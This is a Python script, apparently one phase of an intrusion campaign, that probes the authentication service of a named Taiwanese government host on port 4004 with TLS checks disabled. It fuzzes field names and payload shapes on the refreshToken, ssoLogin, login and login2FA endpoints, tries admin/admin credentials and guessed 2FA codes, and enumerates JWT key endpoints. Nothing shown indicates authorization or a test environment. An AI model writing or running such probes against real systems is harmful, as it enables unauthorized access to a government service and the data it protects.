#!/usr/bin/env python3
"""Phase 2-D: :4004 express-jwt 穷尽 + refreshToken 字段穷尽 + ssoLogin 字段穷尽"""
import http.client, json, ssl, urllib.parse, sys
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

host = 'epcr.tpf.gov.tw'

print("="*80)
print("Phase 2-D1: /refreshToken 字段穷尽")
print("="*80)
# 字段名变体
field_variants = ['refreshToken', 'refresh_token', 'token', 'access_token', 'jwt', 'bearer', 'sid', 'sessionId', 'id_token', 'code', 'auth_code']
for f in field_variants:
    body = json.dumps({f: 'test_token'})
    s, b, _ = req(host, 4004, 'POST', '/refreshToken', body=body)
    print(f"  {{{f!r}:'test_token'}} → status={s}  body={b[:200]!r}")
# form
for f in field_variants[:5]:
    body = urllib.parse.urlencode({f: 'test_token'})
    s, b, _ = req(host, 4004, 'POST', '/refreshToken', body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    print(f"  form {{{f!r}:'test_token'}} → status={s}  body={b[:200]!r}")
# grant_type 组合
print()
print("OAuth2 标准字段组合:")
combos = [
    {"grant_type": "refresh_token", "refresh_token": "test"},
    {"grant_type": "refresh_token", "refreshToken": "test"},
    {"grant_type": "password", "username": "test", "password": "test"},
    {"grant_type": "authorization_code", "code": "test", "redirect_uri": "https://epcr.tpf.gov.tw"},
    {"grant_type": "client_credentials", "client_id": "test", "client_secret": "test"},
    {"token_type_hint": "refresh_token", "token": "test"},
]
for c in combos:
    s, b, _ = req(host, 4004, 'POST', '/refreshToken', body=json.dumps(c))
    print(f"  {c} → status={s}  body={b[:200]!r}")

print()
print("="*80)
print("Phase 2-D2: /ssoLogin 字段穷尽")
print("="*80)
for f in field_variants + ['session_id', 'sessionID', 'SessionID', 'session', 'ssoToken', 'sso_token', 'user', 'username', 'account', 'email']:
    body = json.dumps({f: 'test_session'})
    s, b, _ = req(host, 4004, 'POST', '/ssoLogin', body=body)
    print(f"  {{{f!r}:'test_session'}} → status={s}  body={b[:200]!r}")

# 试试数组格式
print()
print("数组 / 嵌套格式:")
for body_str in [
    '["test_session"]',
    '{"sessionId":["test"]}',
    '{"sessionId":{"value":"test"}}',
    '{"sessionId":123456}',
    '{"sessionId":true}',
    '{"sessionId":null}',
    '{"sessionId":""}',
]:
    s, b, _ = req(host, 4004, 'POST', '/ssoLogin', body=body_str)
    print(f"  {body_str:50s} → status={s}  body={b[:150]!r}")

print()
print("="*80)
print("Phase 2-D3: /login 字段穷尽")
print("="*80)
for f in ['username', 'user', 'account', 'email', 'id', 'login', 'name']:
    body = json.dumps({f: 'admin', 'password': 'admin'})
    s, b, _ = req(host, 4004, 'POST', '/login', body=body)
    print(f"  user={f!r} → status={s}  body={b[:150]!r}")

print()
print("="*80)
print("Phase 2-D4: /login2FA 字段穷尽")
print("="*80)
for body_str in [
    '{"username":"admin","code":"123456"}',
    '{"sessionId":"test","code":"123456"}',
    '{"token":"test","code":"123456"}',
    '{"sessionId":"test","twoFactorCode":"123456"}',
    '{"authCode":"123456"}',
    '{}',
]:
    s, b, _ = req(host, 4004, 'POST', '/login2FA', body=body_str)
    print(f"  {body_str:60s} → status={s}  body={b[:200]!r}")

print()
print("="*80)
print("Phase 2-D5: 公钥端点穷尽 (jwt/publicKey/jwks)")
print("="*80)
for p in ['/.well-known/jwks.json', '/.well-known/openid-configuration', '/oauth/token', '/oauth/jwt/publicKey', '/api/jwt/publicKey', '/jwt/publicKey', '/api/.well-known/jwks.json', '/auth/jwks', '/auth/keys', '/api/keys', '/publicKey', '/api/publicKey']:
    s, b, _ = req(host, 4004, 'GET', p)
    print(f"  GET {p:45s} → status={s}  body={b[:100]!r}")

